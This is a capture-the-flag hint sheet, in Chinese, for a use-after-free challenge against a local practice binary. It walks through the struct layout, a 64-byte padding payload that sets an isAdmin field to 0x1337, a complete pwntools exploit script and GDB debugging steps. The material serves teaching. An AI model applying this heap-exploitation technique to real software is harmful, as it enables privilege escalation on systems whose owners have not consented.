# Level 2: Use-After-Free - 提示

<details>
<summary><b>提示 1: 理解漏洞</b></summary>

程序创建了一个 `admin` 用户和一个普通 `user`。
`admin` 有权限 (`isAdmin = 1`)，但你可以先释放它。
然后编辑 `user` - 但由于堆重用，可能覆盖 `admin` 的内容!

</details>

<details>
<summary><b>提示 2: 数据结构</b></summary>

`User` 结构布局：
```c
struct User {
    char username[32];  // 偏移 0,  大小 32
    char bio[64];       // 偏移 32, 大小 64
    int isAdmin;        // 偏移 96, 大小 4
};
```

`isAdmin` 在偏移 96 字节处。

</details>

<details>
<summary><b>提示 3: 利用步骤</b></summary>

1. 选择 1 - 释放 admin
2. 选择 2 - 编辑 user (bio需要96字节才能覆盖isAdmin)
3. 选择 3 - 打印 admin info (触发检查)

</details>

<details>
<summary><b>提示 4: Payload构造</b></summary>

Bio字段需要：
- 填充 64 字节
- 加上 `isAdmin` 值 (0x1337)

```python
bio = b"A" * 64 + p32(0x1337)
```

</details>

<details>
<summary><b>提示 5: 完整exp</b></summary>

```python
from pwn import *

p = process('./vuln')

# 1. Free admin
p.sendlineafter(b'> ', b'1')

# 2. Edit user with crafted bio
p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'username: ', b'hacker')
p.sendlineafter(b'bio: ', b'A'*64 + p32(0x1337))

# 3. Check admin (UAF!)
p.sendlineafter(b'> ', b'3')

p.interactive()
```

</details>

<details>
<summary><b>提示 6: 调试方法</b></summary>

使用 GDB 观察内存：

```
(gdb) break *main+XXX  # free后
(gdb) run
> 1

(gdb) x/30gx 0x5555...  # admin地址

> 2
> hacker
> AAAAAAAAA...[64 bytes]

(gdb) x/30gx 0x5555...  # 再次查看
```

你应该看到内存被修改了!

</details>
